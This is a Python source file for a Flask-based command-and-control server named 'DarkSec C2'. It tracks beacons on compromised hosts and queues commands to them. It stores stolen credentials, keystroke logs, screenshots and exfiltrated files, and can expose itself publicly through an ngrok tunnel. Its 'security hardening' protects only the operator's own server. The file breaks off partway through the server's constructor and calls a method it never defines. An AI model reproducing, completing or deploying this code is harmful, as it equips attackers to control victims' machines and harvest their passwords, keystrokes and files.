#!/usr/bin/env python3
"""
DarkSec C2 Server - Security Hardened Edition
All security vulnerabilities addressed with enterprise-grade protections
"""

import os
import sys
import json
import time
import sqlite3
import hashlib
import base64
import io
import gzip
import csv
import ssl
import subprocess
import logging
import re
from datetime import datetime, timedelta
from threading import Thread, Lock
from collections import defaultdict, deque
from pathlib import Path

from flask import Flask, request, jsonify, render_template_string, send_file, Response, abort
from flask_sock import Sock
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.backends import default_backend
import secrets

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Plugin system
PLUGINS = {}

def register_plugin(name):
    """Decorator to register plugins"""
    def decorator(func):
        PLUGINS[name] = func
        return func
    return decorator

# ============================================================================
# SECURITY: Input Validation & Sanitization
# ============================================================================

class InputValidator:
    """Centralized input validation"""
    
    # Whitelist of allowed table names (prevents SQL injection)
    ALLOWED_TABLES = {
        'beacons', 'commands', 'credentials', 'exfil_data',
        'screenshots', 'keylogs', 'sessions', 'tasks',
        'auto_tasks', 'api_keys', 'audit_log'
    }
    
    # Whitelist of allowed export formats
    ALLOWED_FORMATS = {'csv', 'json'}
    
    # Whitelist of allowed roles
    ALLOWED_ROLES = {'admin', 'operator', 'viewer'}
    
    # Regex patterns for validation
    BEACON_ID_PATTERN = re.compile(r'^[a-f0-9]{32}$')
    USERNAME_PATTERN = re.compile(r'^[a-zA-Z0-9_-]{3,32}$')
    TAG_PATTERN = re.compile(r'^[a-zA-Z0-9_,-]{0,200}$')
    
    @staticmethod
    def validate_table_name(table_name):
        """Validate table name against whitelist"""
        if table_name not in InputValidator.ALLOWED_TABLES:
            raise ValueError(f"Invalid table name: {table_name}")
        return table_name
    
    @staticmethod
    def validate_export_format(format_name):
        """Validate export format"""
        if format_name not in InputValidator.ALLOWED_FORMATS:
            raise ValueError(f"Invalid format: {format_name}")
        return format_name
    
    @staticmethod
    def validate_role(role):
        """Validate role"""
        if role not in InputValidator.ALLOWED_ROLES:
            raise ValueError(f"Invalid role: {role}")
        return role
    
    @staticmethod
    def validate_beacon_id(beacon_id):
        """Validate beacon ID format"""
        if not InputValidator.BEACON_ID_PATTERN.match(beacon_id):
            raise ValueError("Invalid beacon ID format")
        return beacon_id
    
    @staticmethod
    def validate_username(username):
        """Validate username format"""
        if not InputValidator.USERNAME_PATTERN.match(username):
            raise ValueError("Invalid username format")
        return username
    
    @staticmethod
    def validate_tags(tags):
        """Validate tags format"""
        if not InputValidator.TAG_PATTERN.match(tags):
            raise ValueError("Invalid tags format")
        return tags
    
    @staticmethod
    def validate_limit(limit, max_limit=1000):
        """Validate limit parameter"""
        try:
            limit = int(limit)
            if limit < 1 or limit > max_limit:
                raise ValueError
            return limit
        except (ValueError, TypeError):
            raise ValueError(f"Invalid limit (must be 1-{max_limit})")
    
    @staticmethod
    def sanitize_string(s, max_length=1000):
        """Sanitize string input"""
        if not isinstance(s, str):
            raise ValueError("Input must be string")
        if len(s) > max_length:
            raise ValueError(f"Input too long (max {max_length})")
        # Remove null bytes and control characters
        s = s.replace('\x00', '')
        s = ''.join(char for char in s if ord(char) >= 32 or char in '\n\r\t')
        return s

# ============================================================================
# SECURITY: Rate Limiting
# ============================================================================

class RateLimiter:
    """Token bucket rate limiter"""
    
    def __init__(self, capacity=100, refill_rate=10):
        """
        capacity: max requests per window
        refill_rate: requests added per second
        """
        self.capacity = capacity
        self.refill_rate = refill_rate
        self.buckets = defaultdict(lambda: {'tokens': capacity, 'last_update': time.time()})
        self.lock = Lock()
    
    def is_allowed(self, key):
        """Check if request is allowed"""
        with self.lock:
            bucket = self.buckets[key]
            now = time.time()
            
            # Refill tokens based on time elapsed
            elapsed = now - bucket['last_update']
            bucket['tokens'] = min(
                self.capacity,
                bucket['tokens'] + (elapsed * self.refill_rate)
            )
            bucket['last_update'] = now
            
            # Check if request can be served
            if bucket['tokens'] >= 1:
                bucket['tokens'] -= 1
                return True
            return False
    
    def cleanup_old_entries(self, max_age=3600):
        """Remove old entries to prevent memory leak"""
        with self.lock:
            now = time.time()
            to_remove = [
                key for key, bucket in self.buckets.items()
                if now - bucket['last_update'] > max_age
            ]
            for key in to_remove:
                del self.buckets[key]

# ============================================================================
# SECURITY: Request Logging & Audit
# ============================================================================

class RequestLogger:
    """Log all API requests for security audit"""
    
    def __init__(self, log_file='api_requests.log'):
        self.log_file = log_file
        self.logger = logging.getLogger('api_requests')
        handler = logging.FileHandler(log_file)
        handler.setFormatter(logging.Formatter(
            '%(asctime)s | %(message)s'
        ))
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)
    
    def log_request(self, ip, method, path, user, status_code):
        """Log API request"""
        self.logger.info(
            f"{ip} | {method} | {path} | {user} | {status_code}"
        )

# ============================================================================
# Original Classes with Security Enhancements
# ============================================================================

class EncryptionManager:
    """Handle encryption/decryption for exfil data"""
    
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt_data(self, data):
        """Encrypt and compress data"""
        try:
            if isinstance(data, str):
                data = data.encode()
            compressed = gzip.compress(data)
            encrypted = self.cipher.encrypt(compressed)
            return encrypted
        except Exception as e:
            logger.error(f"Encryption error: {e}", exc_info=True)
            raise
    
    def decrypt_data(self, encrypted_data):
        """Decrypt and decompress data"""
        try:
            decrypted = self.cipher.decrypt(encrypted_data)
            decompressed = gzip.decompress(decrypted)
            return decompressed
        except Exception as e:
            logger.error(f"Decryption error: {e}", exc_info=True)
            raise
    
    def save_key(self, filepath='encryption_key.bin'):
        """Save encryption key"""
        try:
            with open(filepath, 'wb') as f:
                f.write(self.key)
            os.chmod(filepath, 0o600)  # Owner read/write only
            logger.info(f"Encryption key saved to {filepath}")
        except Exception as e:
            logger.error(f"Failed to save encryption key: {e}", exc_info=True)
            raise
    
    def load_key(self, filepath='encryption_key.bin'):
        """Load encryption key"""
        if os.path.exists(filepath):
            try:
                with open(filepath, 'rb') as f:
                    self.key = f.read()
                    self.cipher = Fernet(self.key)
                logger.info("Encryption key loaded")
            except Exception as e:
                logger.error(f"Failed to load encryption key: {e}", exc_info=True)
                raise

class SSLManager:
    """Manage SSL/TLS certificates"""
    
    @staticmethod
    def generate_self_signed_cert(cert_file='cert.pem', key_file='key.pem'):
        """Generate self-signed SSL certificate"""
        try:
            # Generate private key
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            
            # Write private key
            with open(key_file, 'wb') as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            os.chmod(key_file, 0o600)
            
            # Generate certificate
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"Cyber"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, u"Dark"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"DarkSec"),
                x509.NameAttribute(NameOID.COMMON_NAME, u"darksec.local"),
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.utcnow()
            ).not_valid_after(
                datetime.utcnow() + timedelta(days=365)
            ).sign(private_key, hashes.SHA256(), default_backend())
            
            # Write certificate
            with open(cert_file, 'wb') as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            logger.info(f"Generated SSL certificate: {cert_file}, {key_file}")
            return cert_file, key_file
        except Exception as e:
            logger.error(f"Failed to generate SSL certificate: {e}", exc_info=True)
            raise

class NgrokManager:
    """Manage ngrok tunnels"""
    
    def __init__(self):
        self.process = None
        self.public_url = None
    
    def start_tunnel(self, port, auth_token=None):
        """Start ngrok tunnel"""
        try:
            if auth_token:
                subprocess.run(['ngrok', 'authtoken', auth_token], check=True)
            
            self.process = subprocess.Popen(
                ['ngrok', 'http', str(port), '--log=stdout'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(3)
            
            import requests
            try:
                resp = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                tunnels = resp.json()['tunnels']
                if tunnels:
                    self.public_url = tunnels[0]['public_url']
                    logger.info(f"Ngrok tunnel active: {self.public_url}")
                    return self.public_url
            except Exception as e:
                logger.warning(f"Could not fetch ngrok URL: {e}")
            
            return None
        except Exception as e:
            logger.error(f"Ngrok error: {e}", exc_info=True)
            return None
    
    def stop_tunnel(self):
        """Stop ngrok tunnel"""
        if self.process:
            self.process.terminate()
            self.process = None
            logger.info("Ngrok tunnel stopped")

class C2Database:
    """Enhanced SQLite database with security fixes"""
    
    def __init__(self, db_path='c2_data.db'):
        self.db_path = db_path
        self.conn = None
        self.lock = Lock()
        self.init_db()

    # ---- API Keys helpers ----
    def list_api_keys(self):
        try:
            with self.lock:
                cur = self.conn.cursor()
                cur.execute('SELECT key_hash, username, role, description, created, last_used, permissions FROM api_keys ORDER BY created DESC')
                rows = cur.fetchall()
                return rows
        except Exception as e:
            logger.error(f"Failed to list api keys: {e}", exc_info=True)
            raise

    def delete_api_key(self, key_hash):
        try:
            with self.lock:
                cur = self.conn.cursor()
                cur.execute('DELETE FROM api_keys WHERE key_hash = ?', (key_hash,))
                self.conn.commit()
                return cur.rowcount
        except Exception as e:
            logger.error(f"Failed to delete api key: {e}", exc_info=True)
            raise

    # ---- Exfil/files helpers ----
    def list_exfil_by_beacon(self, beacon_id, limit=100):
        try:
            with self.lock:
                cur = self.conn.cursor()
                cur.execute('''SELECT id, data_type, filename, file_size, timestamp FROM exfil_data 
                               WHERE beacon_id = ? ORDER BY timestamp DESC LIMIT ?''', (beacon_id, limit))
                return cur.fetchall()
        except Exception as e:
            logger.error(f"Failed to list exfil: {e}", exc_info=True)
            raise

    def get_exfil_blob(self, file_id):
        try:
            with self.lock:
                cur = self.conn.cursor()
                cur.execute('SELECT filename, data, encrypted FROM exfil_data WHERE id = ?', (file_id,))
                row = cur.fetchone()
                return row
        except Exception as e:
            logger.error(f"Failed to get exfil blob: {e}", exc_info=True)
            raise

    def delete_exfil(self, file_id):
        try:
            with self.lock:
                cur = self.conn.cursor()
                cur.execute('DELETE FROM exfil_data WHERE id = ?', (file_id,))
                self.conn.commit()
                return cur.rowcount
        except Exception as e:
            logger.error(f"Failed to delete exfil: {e}", exc_info=True)
            raise
    
    def init_db(self):
        """Initialize database schema with new tables"""
        try:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            cursor = self.conn.cursor()
            # Pragmas for reliability/perf
            cursor.execute('PRAGMA journal_mode=WAL;')
            cursor.execute('PRAGMA synchronous=NORMAL;')
            cursor.execute('PRAGMA temp_store=MEMORY;')
            
            # Beacons table (enhanced with tags)
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS beacons (
                    id TEXT PRIMARY KEY,
                    hostname TEXT,
                    username TEXT,
                    os_type TEXT,
                    ip_address TEXT,
                    first_seen TIMESTAMP,
                    last_seen TIMESTAMP,
                    status TEXT,
                    metadata TEXT,
                    tags TEXT,
                    group_name TEXT,
                    health_status TEXT DEFAULT 'healthy'
                )
            ''')
            
            # Commands table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    command TEXT,
                    timestamp TIMESTAMP,
                    status TEXT,
                    result TEXT,
                    operator TEXT,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Exfiltrated data table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS exfil_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    data_type TEXT,
                    filename TEXT,
                    data BLOB,
                    encrypted BOOLEAN DEFAULT 1,
                    timestamp TIMESTAMP,
                    file_size INTEGER,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Enhanced API keys table with roles
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS api_keys (
                    key_hash TEXT PRIMARY KEY,
                    username TEXT,
                    role TEXT,
                    description TEXT,
                    created TIMESTAMP,
                    last_used TIMESTAMP,
                    permissions TEXT
                )
            ''')
            
            # Sessions table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS sessions (
                    id TEXT PRIMARY KEY,
                    beacon_id TEXT,
                    session_type TEXT,
                    created TIMESTAMP,
                    last_active TIMESTAMP,
                    status TEXT,
                    metadata TEXT,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Screenshots table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS screenshots (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    image_data BLOB,
                    timestamp TIMESTAMP,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Keylog table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS keylogs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    keystrokes TEXT,
                    window_title TEXT,
                    timestamp TIMESTAMP,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Credentials table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    source TEXT,
                    username TEXT,
                    password TEXT,
                    domain TEXT,
                    timestamp TIMESTAMP,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Tasks table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS tasks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    task_type TEXT,
                    task_data TEXT,
                    schedule_time TIMESTAMP,
                    executed BOOLEAN DEFAULT 0,
                    result TEXT,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Auto-tasks table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS auto_tasks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    task_name TEXT,
                    command TEXT,
                    enabled BOOLEAN DEFAULT 1,
                    trigger_condition TEXT,
                    created TIMESTAMP
                )
            ''')
            
            # Beacon groups table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS beacon_groups (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    group_name TEXT UNIQUE,
                    description TEXT,
                    created TIMESTAMP
                )
            ''')
            
            # Listener profiles table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS listener_profiles (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    profile_name TEXT UNIQUE,
                    port INTEGER,
                    protocol TEXT,
                    enabled BOOLEAN DEFAULT 1,
                    metadata TEXT,
                    created TIMESTAMP
                )
            ''')
            
            # Audit log table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS audit_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP,
                    operator TEXT,
                    action TEXT,
                    target TEXT,
                    details TEXT
                )
            ''')
            
            # Indexes
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_beacons_last_seen ON beacons(last_seen);')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_cmd_beacon ON commands(beacon_id);')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_exfil_beacon ON exfil_data(beacon_id);')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_keylog_beacon ON keylogs(beacon_id);')
            
            self.conn.commit()
            logger.info("Database initialized successfully")
        except Exception as e:
            logger.error(f"Database initialization failed: {e}", exc_info=True)
            raise
    
    def register_beacon(self, beacon_id, hostname, username, os_type, ip_address, metadata, tags=''):
        """Register new beacon with tags - SECURITY: Validates inputs"""
        try:
            # Validate inputs
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            hostname = InputValidator.sanitize_string(hostname, 255)
            username = InputValidator.sanitize_string(username, 255)
            os_type = InputValidator.sanitize_string(os_type, 100)
            tags = InputValidator.validate_tags(tags)
            
            with self.lock:
                cursor = self.conn.cursor()
                now = datetime.now().isoformat()
                
                cursor.execute('''\
                    INSERT OR REPLACE INTO beacons 
                    (id, hostname, username, os_type, ip_address, first_seen, last_seen, status, metadata, tags, health_status)
                    VALUES (?, ?, ?, ?, ?, 
                        COALESCE((SELECT first_seen FROM beacons WHERE id = ?), ?),
                        ?, 'active', ?, ?, 'healthy')
                ''', (beacon_id, hostname, username, os_type, ip_address, 
                      beacon_id, now, now, json.dumps(metadata), tags))
                
                self.conn.commit()
                logger.info(f"Beacon registered: {beacon_id}")
                return beacon_id
        except Exception as e:
            logger.error(f"Failed to register beacon: {e}", exc_info=True)
            raise
    
    def update_beacon_health(self, beacon_id, health_status):
        """Update beacon health status"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('UPDATE beacons SET health_status = ? WHERE id = ?', (health_status, beacon_id))
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update beacon health: {e}", exc_info=True)
            raise
    
    def get_beacons(self, active_only=False, group=None, tags=None, limit=100, offset=0):
        """Get beacons with filtering options - SECURITY: Safe parameterized queries"""
        try:
            with self.lock:
                cursor = self.conn.cursor()
                query = 'SELECT * FROM beacons WHERE 1=1'
                params = []
                
                if active_only:
                    query += ' AND status = ?'
                    params.append('active')
                if group:
                    group = InputValidator.sanitize_string(group, 100)
                    query += ' AND group_name = ?'
                    params.append(group)
                if tags:
                    tags = InputValidator.validate_tags(tags)
                    query += ' AND tags LIKE ?'
                    params.append(f'%{tags}%')
                
                query += ' ORDER BY last_seen DESC LIMIT ? OFFSET ?'
                params.extend([int(limit), int(offset)])
                cursor.execute(query, params)
                return cursor.fetchall()
        except Exception as e:
            logger.error(f"Failed to get beacons: {e}", exc_info=True)
            raise
    
    def add_command(self, beacon_id, command, operator='system'):
        """Add command with operator tracking - SECURITY: Validates inputs"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            command = InputValidator.sanitize_string(command, 10000)
            operator = InputValidator.sanitize_string(operator, 255)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO commands (beacon_id, command, timestamp, status, operator)
                    VALUES (?, ?, ?, 'pending', ?)
                ''', (beacon_id, command, datetime.now().isoformat(), operator))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add command: {e}", exc_info=True)
            raise
    
    def get_command_history(self, beacon_id, limit=100):
        """Get command history for beacon - SECURITY: Validates limit"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            limit = InputValidator.validate_limit(limit, 1000)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    SELECT id, command, timestamp, status, result, operator
                    FROM commands 
                    WHERE beacon_id = ?
                    ORDER BY timestamp DESC
                    LIMIT ?
                ''', (beacon_id, limit))
                return cursor.fetchall()
        except Exception as e:
            logger.error(f"Failed to get command history: {e}", exc_info=True)
            raise
    
    def get_pending_commands(self, beacon_id):
        """Get pending commands"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    SELECT id, command FROM commands 
                    WHERE beacon_id = ? AND status = 'pending'
                    ORDER BY timestamp ASC
                ''', (beacon_id,))
                return cursor.fetchall()
        except Exception as e:
            logger.error(f"Failed to get pending commands: {e}", exc_info=True)
            raise
    
    def update_command_result(self, command_id, result):
        """Update command result (truncates to 200 KB)"""
        try:
            command_id = int(command_id)
            if not isinstance(result, str):
                result = str(result)
            # Cap size to 200 KB to keep DB small
            max_len = 200 * 1024
            if len(result) > max_len:
                result = result[:max_len] + "\n[truncated]"
            result = InputValidator.sanitize_string(result, 210000)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    UPDATE commands 
                    SET status = 'completed', result = ?
                    WHERE id = ?
                ''', (result, command_id))
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update command result: {e}", exc_info=True)
            raise
    
    def store_exfil_data(self, beacon_id, data_type, filename, data, encrypted=True):
        """Store encrypted exfil data"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            data_type = InputValidator.sanitize_string(data_type, 100)
            filename = InputValidator.sanitize_string(filename, 255)
            
            with self.lock:
                cursor = self.conn.cursor()
                file_size = len(data) if data else 0
                cursor.execute('''\
                    INSERT INTO exfil_data (beacon_id, data_type, filename, data, encrypted, timestamp, file_size)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (beacon_id, data_type, filename, data, encrypted, datetime.now().isoformat(), file_size))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to store exfil data: {e}", exc_info=True)
            raise
    
    def create_api_key(self, username, role='operator', permissions='read,write'):
        """Create API key with role - SECURITY: Validates inputs"""
        try:
            username = InputValidator.validate_username(username)
            role = InputValidator.validate_role(role)
            permissions = InputValidator.sanitize_string(permissions, 200)
            
            with self.lock:
                key = secrets.token_urlsafe(32)
                key_hash = hashlib.sha256(key.encode()).hexdigest()
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO api_keys (key_hash, username, role, description, created, permissions)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (key_hash, username, role, f'{role} key for {username}', datetime.now().isoformat(), permissions))
                self.conn.commit()
                logger.info(f"API key created for user: {username}")
                return key
        except Exception as e:
            logger.error(f"Failed to create API key: {e}", exc_info=True)
            raise
    
    def verify_api_key(self, key):
        """Verify API key and return user info"""
        if not key:
            return None
        
        try:
            key_hash = hashlib.sha256(key.encode()).hexdigest()
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('SELECT username, role, permissions FROM api_keys WHERE key_hash = ?', (key_hash,))
                result = cursor.fetchone()
                if result:
                    # Update last used
                    cursor.execute('UPDATE api_keys SET last_used = ? WHERE key_hash = ?', 
                                 (datetime.now().isoformat(), key_hash))
                    self.conn.commit()
                    return {'username': result[0], 'role': result[1], 'permissions': result[2].split(',')}
                return None
        except Exception as e:
            logger.error(f"Failed to verify API key: {e}", exc_info=True)
            return None
    
    def add_auto_task(self, task_name, command, trigger_condition='on_register'):
        """Add auto-task - SECURITY: Validates inputs"""
        try:
            task_name = InputValidator.sanitize_string(task_name, 255)
            command = InputValidator.sanitize_string(command, 10000)
            trigger_condition = InputValidator.sanitize_string(trigger_condition, 100)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO auto_tasks (task_name, command, enabled, trigger_condition, created)
                    VALUES (?, ?, 1, ?, ?)
                ''', (task_name, command, trigger_condition, datetime.now().isoformat()))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add auto-task: {e}", exc_info=True)
            raise
    
    def get_auto_tasks(self, trigger_condition=None):
        """Get auto-tasks"""
        try:
            with self.lock:
                cursor = self.conn.cursor()
                if trigger_condition:
                    trigger_condition = InputValidator.sanitize_string(trigger_condition, 100)
                    cursor.execute('SELECT * FROM auto_tasks WHERE enabled = 1 AND trigger_condition = ?', (trigger_condition,))
                else:
                    cursor.execute('SELECT * FROM auto_tasks WHERE enabled = 1')
                return cursor.fetchall()
        except Exception as e:
            logger.error(f"Failed to get auto-tasks: {e}", exc_info=True)
            raise
    
    def add_audit_log(self, operator, action, target, details=''):
        """Add audit log entry"""
        try:
            operator = InputValidator.sanitize_string(operator, 255)
            action = InputValidator.sanitize_string(action, 255)
            target = InputValidator.sanitize_string(target, 255)
            details = InputValidator.sanitize_string(details, 10000)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO audit_log (timestamp, operator, action, target, details)
                    VALUES (?, ?, ?, ?, ?)
                ''', (datetime.now().isoformat(), operator, action, target, details))
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to add audit log: {e}", exc_info=True)
    
    def export_to_csv(self, table_name, output_file):
        """Export table to CSV - SECURITY: Validates table name"""
        try:
            table_name = InputValidator.validate_table_name(table_name)
            
            with self.lock:
                cursor = self.conn.cursor()
                # Safe to use f-string here since table_name is validated
                cursor.execute(f'SELECT * FROM {table_name}')
                rows = cursor.fetchall()
                
                if rows:
                    columns = [description[0] for description in cursor.description]
                    with open(output_file, 'w', newline='') as f:
                        writer = csv.writer(f)
                        writer.writerow(columns)
                        writer.writerows(rows)
                    return True
                return False
        except Exception as e:
            logger.error(f"Failed to export to CSV: {e}", exc_info=True)
            raise
    
    def store_screenshot(self, beacon_id, image_data):
        """Store screenshot"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO screenshots (beacon_id, image_data, timestamp)
                    VALUES (?, ?, ?)
                ''', (beacon_id, image_data, datetime.now().isoformat()))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to store screenshot: {e}", exc_info=True)
            raise
    
    def store_keylog(self, beacon_id, keystrokes, window_title):
        """Store keylog"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            keystrokes = InputValidator.sanitize_string(keystrokes, 100000)
            window_title = InputValidator.sanitize_string(window_title, 255)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO keylogs (beacon_id, keystrokes, window_title, timestamp)
                    VALUES (?, ?, ?, ?)
                ''', (beacon_id, keystrokes, window_title, datetime.now().isoformat()))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to store keylog: {e}", exc_info=True)
            raise
    
    def store_credentials(self, beacon_id, source, username, password, domain=''):
        """Store credentials"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            source = InputValidator.sanitize_string(source, 255)
            username = InputValidator.sanitize_string(username, 255)
            password = InputValidator.sanitize_string(password, 255)
            domain = InputValidator.sanitize_string(domain, 255)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO credentials (beacon_id, source, username, password, domain, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (beacon_id, source, username, password, domain, datetime.now().isoformat()))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to store credentials: {e}", exc_info=True)
            raise
    
    def get_credentials(self, beacon_id=None):
        """Get credentials"""
        try:
            with self.lock:
                cursor = self.conn.cursor()
                if beacon_id:
                    beacon_id = InputValidator.validate_beacon_id(beacon_id)
                    cursor.execute('SELECT * FROM credentials WHERE beacon_id = ?', (beacon_id,))
                else:
                    cursor.execute('SELECT * FROM credentials ORDER BY timestamp DESC')
                return cursor.fetchall()
        except Exception as e:
            logger.error(f"Failed to get credentials: {e}", exc_info=True)
            raise

class HealthMonitor:
    """Monitor beacon health"""
    
    def __init__(self, db):
        self.db = db
        self.running = False
        self.thread = None
    
    def start(self):
        """Start health monitoring"""
        self.running = True
        self.thread = Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()
        logger.info("Health monitoring started")
    
    def stop(self):
        """Stop health monitoring"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        logger.info("Health monitoring stopped")
    
    def _monitor_loop(self):
        """Monitor beacons for health issues"""
        while self.running:
            try:
                beacons = self.db.get_beacons()
                now = datetime.now()
                
                for beacon in beacons:
                    beacon_id = beacon[0]
                    last_seen = datetime.fromisoformat(beacon[6])
                    
                    time_diff = (now - last_seen).total_seconds()
                    
                    if time_diff > 600:
                        self.db.update_beacon_health(beacon_id, 'dead')
                    elif time_diff > 300:
                        self.db.update_beacon_health(beacon_id, 'warning')
                    else:
                        self.db.update_beacon_health(beacon_id, 'healthy')
                
            except Exception as e:
                logger.error(f"Health monitor error: {e}", exc_info=True)
            
            time.sleep(30)

# ============================================================================
# SECURITY: Enhanced C2 Server with Security Fixes
# ============================================================================

class C2Server:
    """Security-hardened C2 Server"""
    
    def __init__(self, host='0.0.0.0', port=8443, use_ssl=False, use_ngrok=False, ngrok_token=None):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.use_ngrok = use_ngrok
        self.app = Flask(__name__)
        self.app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024  # 10MB upload cap
        self.sock = Sock(self.app)
        # Web UI dir (if present)
        self._webui_dir = (Path(__file__).resolve().parent / 'webui')
        # If build was copied as webui/out, use that
        try:
            if (self._webui_dir / 'out').exists():
                self._webui_dir = self._webui_dir / 'out'
        except Exception:
            pass
        self.app.secret_key = secrets.token_hex(32)
        
        # Initialize security components
        self.rate_limiter = RateLimiter(capacity=100, refill_rate=10)
        self.request_logger = RequestLogger()
        
        # Initialize components
        self.db = C2Database()
        self.encryption = EncryptionManager()
        self.encryption.load_key()
        if not os.path.exists('encryption_key.bin'):
            self.encryption.save_key()
        
        self.health_monitor = HealthMonitor(self.db)
        self.ngrok_manager = NgrokManager() if use_ngrok else None
        
        # WebSocket connections
        self.ws_connections = {}
        
        # Generate master key
        self.master_key = self._generate_master_key()
        
        # Setup SSL if enabled
        self.ssl_context = None
        if use_ssl:
            if not os.path.exists('cert.pem') or not os.path.exists('key.pem'):
                SSLManager.generate_self_signed_cert()
